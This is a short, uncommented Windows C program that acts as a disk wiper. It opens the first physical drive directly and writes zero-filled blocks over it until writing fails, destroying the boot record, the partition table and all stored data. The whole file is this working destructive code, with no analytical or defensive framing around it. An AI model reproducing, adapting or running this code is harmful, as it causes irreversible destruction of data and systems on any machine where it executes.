#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#define SIZE 65536

const char buffer[SIZE] = {0};

int main(int argc, char *argv[])
{
	DWORD written;
	HANDLE disk = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(disk == INVALID_HANDLE_VALUE)
		return 1;

	while(WriteFile(disk, buffer, SIZE, &written, NULL));
	return 0;
}
